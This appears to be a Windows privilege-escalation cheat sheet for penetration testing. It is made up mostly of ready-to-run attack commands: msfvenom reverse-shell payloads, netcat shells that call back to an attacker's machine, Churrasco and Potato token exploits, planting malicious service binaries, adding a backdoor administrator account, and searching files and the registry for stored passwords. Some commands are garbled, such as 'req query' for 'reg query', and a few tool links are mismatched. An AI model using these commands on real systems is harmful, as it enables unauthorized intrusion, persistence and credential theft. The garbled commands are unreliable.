- [Get information about Windows machine](#Get-information-about-Windows-machine)
  - [Basic enumeration](#Basic-enumeration)

- [Windows kernel exploits](#Windows-kernel-exploits)
  - [Windows kernel exploits resources](#Windows-kernel-exploits-resources)

- [Unquoted Service Paths](#Unquoted_service_paths)
  - [Check binary path name](#Check_binary_path_name)
  - [Unquoted service paths exploitaion](#Unquoted_service_paths_exploitaion)

- [Weak permissions](#weak_permissions)
  - [Folder permissions](#folder)
    - [Check folder permissions](#Check_folder_permissions)
    - [Folder permissions exploitation](#Folder_permissions_exploitation)
  - [Service permissions](#service)
  - [Registry permissions](#registry)

- [Token Kidnapping (churrasco)](#Token_Kidnapping)

- [Token impersonation](#Token-impersonation)
  - [Description](#Description)

- [Antivirus and firewall](#Antivirus-and-firewall)
  - [Check windows defender status](#Check-windows-defender-status)
  - [Check all services status](#Check-all-services-status)
  - [Check firewall status](#Check-firewall-status)

- [Metasploit](#Metasploit)
  - [Local Exploit Suggester](#Local-exploit-suggester)

- [Hardcoded passwords](#Hardcoded-passwords)
  - [Search for password](#Search-for-password)
  - [Search passwords in config files](#Search-passwords-in-config-files)
  - [Search password in all files](#Search-password-in-all-files)
  - [Search password in registers](#Search-password-in-registers)

- [DLL Hijacking](#Token_Hijacking)

- [Hot Potato/Rotten Patato](#Hot-Potato)
  - [Authenticated_user_hot_potato](#Authenticated-user-hot-potato)
  - [Hot Potato via powershell](#Hot-Potato-via-powershell)
  
- [Alternate Data Streams](#Alternate-data-streams)
Alternate Data Streams (ADS) are a file attribute only found on the NTFS file system. It is a way to hide some information in file.
- check file for ADS
```
dir /R

example
more < hm.txt:root.txt:$DATA
```

- [Tools](#Tools)
--------------------------------------------------------------------------------------------------------------------------------------
# Get information about Windows machine

## Basic enumeration

- OS info
```
systeminfo

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

- user info
```
whoami

whoami /priv

whoami /groups
```

- host info 
```
hostname
```

- users info
```
net users

net user <user_name>

net localgroup

net localgroup administrators
```

- network interfaces and routing table
```
ipconfig /all

route print

arp -A
```

- network connections and the firewall rules
```
netsh firewall show state

netsh firewall show config
```

- scheduled tasks, running processes, started services and installed drivers.
```
schtasks /query /fo LIST /v

tasklist /SVC

net start
```

- services
```
netstat -ano
```

- Windows managment instrumentation (check patch)
``` 
wmic qfe

wmic qfe get Caption,Description,HotFixID,InstalledOn
```

- Windows managment instrumentation (check logical disk)
```
wmic logicaldisk get caption,description,providername

wmic logicaldisk get caption
```

-----------------------------------------------------------------------------------------------------------------------------------

# Windows kernel exploits

## Windows kernel exploits resources
- https://github.com/SecWiki/windows-kernel-exploits

--------------------------------------------------------------------------------------------------------------------------------------

# Unquoted_service_paths

When a service is started Windows will search for the binary to execute. The location of the binary to be executed is declared in the binPath attribute. If the path to the binary is unquoted, Windows does not know where the binary is located and will search in all folders, from the beginning of the path.

So, if we want to exploit this misconfiguration, three conditions have to be met:
- The service path is unquoted;
- The service path contains space; and
- We have write permission in one of the intermediate folders.

### Check_binary_path_name
```
sc qc unquotedsvc
```
### Unquoted_service_paths_exploitaion

For **binPath** C:\Program Files\Unquoted Path Service\Common Files\service.exe

Windows will search in this order:
- C:\Program.exe
- C:\Program Files\Unquoted.exe
- C:\Program Files\Unquoted Path.exe
- C:\Program Files\Unquoted Path Service\Common.exe
- C:\Program Files\Unquoted Path Service\Common Files\service.exe

Store payload in the:
```
C:\Program Files\Unquoted Path Service\common.exe
```
Execute the payload by starting the service:
```
sc start unquotedsvc
```
--------------------------------------------------------------------------------------------------------------------------------------

# weak_permissions

## folder
If a user has write permission in a folder used by a service, he can replace the binary with a malicious one. When the service is restarted the malicious binary is executed with higher privileges.

### Check_folder_permissions
```
TO DO
```

### Folder_permissions_exploitation
```
copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"

sc start filepermsvc
```
## service

--------------------------------------------------------------------------------------------------------------------------------------

# Token_Kidnapping
Basically, Server 2003 allows for the NETWORK SERVICE and LOCAL SERVICE accounts to impersonate the SYSTEM account, if this privilege is enabled.
- check whoami /all
SeImpersonatePrivilege privilege is enabled?

Churrasco.exe
- https://github.com/Re4son/Churrasco/raw/master/churrasco.exe

run:
```
churrasco.exe -d "whoami"
 or 
 
churrasco.exe -d "cmd.exe"
```
## Case_study
- on Windows machine create c:\temp folder
- on lonux machine run smb server:
```
python smbserver share smb
```
-move churrasco.exe to smb folder
-on windows machine
```
copy \\<kali_ip>\share\churrasco.exe
```
- create msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp lhost=<kali_ip> lport=4444 -f exe -o rs.exe
```
send rs.exe via smb and run:
```
churrasco.exe -d "C:\temp\rs.exe"
```
-----------------------------------------------------------------------------------------------------------------------------------
# Token impersonation

## Description
- Tokens are temporary keys allow you access to a system/network without having to provide credentials each time you access the file.
 There are two types of token:
 
 Delegate: create for logging into a machine or using Remote Desktop
 Impersonate: attaching a network drive or a domain logon script
 
 ## Exploitaion
 - meterpreter
 ```
getuid
 
load incognito
 
list_tokens -u
 
  - Check for available tokens - 
  
impersonate_token example\\token
 
shell
```
- Check whoami
```
whoami
```
-----------------------------------------------------------------------------------------------------------------------------------
# Antivirus
 
## Check windows defender status
```
sc query windefend
```

## Check all services status
```
sc queryex type= service
```

## Check firewall status
```
netsh advfirewall firewall dump
```

```
netsh firewall show state
```

```
netsh firewall show config
```
--------------------------------------------------------------------------------------------------------------------------------------

# Metasploit

## Local Exploit Suggester
```
meterpreter> background
msf> use post/multi/recon/local_exploit_suggester
msf> run
msf> use exploit/windows/local/ms10_015_kitrap0d (for example)
msf> options
msf> set session x
msf> set lhost
msf> set lport
msf> run
```
--------------------------------------------------------------------------------------------------------------------------------------

# Hardcoded_passwords

## Search for password

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.ini *.txt **config
```

## Search passwords in config files

```
dir /s *pass* == *cred* == *vnc* == *config*
```

## Search password in all files

```
findstr /spin "password" *.*
```

## Search password in common config file

```
C:\sysprep.inf
C:\sysprep\sysprep.xml
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```
## Search password in registers
- VNC
```
  req query "HKCU\SOFTWARE\ORL\WinVNC3\Password"
```

- Windows autologin
```  
  req query "HKCU\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

- SNMP Parameters
```  
  req query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

- Putty
```
  req query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"
```

## Search_in_registry
```
req query HKLM /f password /t REG_SZ /s

req query HKCU /f password /t REG_SZ /s
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Token_Hijacking

## Privilage escalation for *nt authority\network service*
Network Service account is a special built-in account that has reduced privileges similar to an authenticated user account. This limited access helps safeguard the computer if an attacker compromises individual services or processes.
```
c:> whoami
whoami
nt authority\network service
```

## Check /priv
```
c:> whoami /priv
whoami /priv

check for SeImpersonatePrivilage is Enabled
```

## Upload *churrasco.exe*
- https://github.com/Re4son/Churrasco

## Create user *add user to localgroup Administrator*
```
churrasco.bin "net user oscp oscp /add && net localgroup Administrators oscp /add"
```

## Create connection *nc connection*
```
churrasco.exe "nc.exe <your_machine_ip> <your_machine_port> -e cmd.exe"
```

## Create reverse shell
```
msfvenom -p windows/shell_reverse_tcp lhost=<your_ip_address> lport=<your_port> -f exe -o revshell.exe
upload revshell.exe to machine
```

churrasco.exe -d "C:\revshell\exe\path\"

in your machine nc -lnvp xyz
----------------------------------------------------------------------------------------------------------------------------------------------------------------

# Hot Potato
Technique is actually a combination of two known windows issues  like NBNS spoofing and NTLM relay with the implementation of a fake WPAD proxy server which is running locally on the target host.

NTLM authentication via the same protocol like SMB has been already patched by Microsoft however this technique is using HTTP to SMB authentication in order to create a high privilege service as the HTTP request might come from a high privilege service like the Windows update. Since the traffic contains the NTLM credentials and is passing through a fake proxy server it can be captured and passed to a local SMB listener to create an elevated service which can execute any command  as SYSTEM.
https://foxglovesecurity.com/2016/01/16/hot-potato/

## Authenticated user hot potato
- https://github.com/foxglovesec/Potato
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
Potato.exe -ip [IP] -cmd "C:\\Windows\\System32\\cmd.exe -K net localgroup administrator [username] /ADD" -disable_exhaust true -disable _defender true

## Hot Potato via powershell

- https://github.com/Kevin-Robertson/Tater

## Juicy potato
- https://github.com/ohpe/juicy-potato

--------------------------------------------------------------------------------------------------------------------------------------
# Tools

- PowerShell

  - Sherlock
    - https://github.com/sherlock-project/sherlock
  - PowerUp
    - https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
  - jaws-enum
    - https://github.com/411Hall/JAWS

- Executables
  - winPEAS
    - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
  - Seatbelt
    - https://github.com/GhostPack/Seatbelt
  - Watson
    - https://github.com/rasta-mouse/Watson
  - SharpUp
    - https://github.com/GhostPack/SharpUp
  
- Others
  - exploit suggester (metasploit)
    - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
  - exploit suggester (local)
    - https://github.com/mzet-/linux-exploit-suggester
